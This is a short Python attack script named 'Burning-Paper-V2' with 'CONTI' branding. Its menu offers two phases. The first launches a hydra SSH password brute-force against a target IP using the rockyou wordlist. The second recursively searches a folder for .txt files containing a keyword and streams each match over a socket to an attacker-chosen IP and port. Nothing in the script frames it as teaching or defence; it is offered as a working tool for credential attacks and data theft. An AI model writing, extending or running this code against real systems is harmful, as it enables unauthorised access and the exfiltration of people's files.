import os, socket, time



def change_direct():
    ip = str(input("Enter IP of destination here: "))
    port =  int(input("Enter port of destination here: "))
    path = input(r"Startpoint: ")
    keyword = input("Keyword/Phrase: ")
    search_folder(path, keyword, ip, port)

def sendfile(path, ip, port):
    s = socket.socket()
    s.connect((ip, port))
    f = open(path, "rb")
    l = f.read(1024)
    while l:
        s.send(l)
        l = f.read(1024)
    f.close()
    s.close()

def search_folder(path, keyword, ip, port):
    #global contains
    dirs = os.listdir(path)
    for directory in dirs: 
        if directory.endswith(".txt"):
            filename = path + directory
            try:
                file_ = open(path + directory, "r")
                if keyword in file_.read():
                    sendfile(filename, ip, port)                   
            except:
                pass
        elif "." not in directory.split(" "):
            search_folder(path + directory, keyword, ip, port)
   



user_input = int(input("""
++++++++++++++++++Burning-Paper-V2++++++++++++++++++

        Death to Freedom Of Speach!!!!

        Press 1 to initiate fase 1

        Press 2 to initiate fase 2

++++++++++++++++++++++++CONTI++++++++++++++++++++++++
        Its up to you: """))       



if user_input == 1:
    ip_hydratarget = str(input(r"Target IP: "))
    print("Brute Force is starting.....")
    time.sleep(2)
    command = (f"hydra -l kali -P /usr/share/wordlists/rockyou.txt {ip_hydratarget}  ssh -t 16 -I -v")
    os.system(command)




if user_input == 2:
    change_direct()
    
    

    
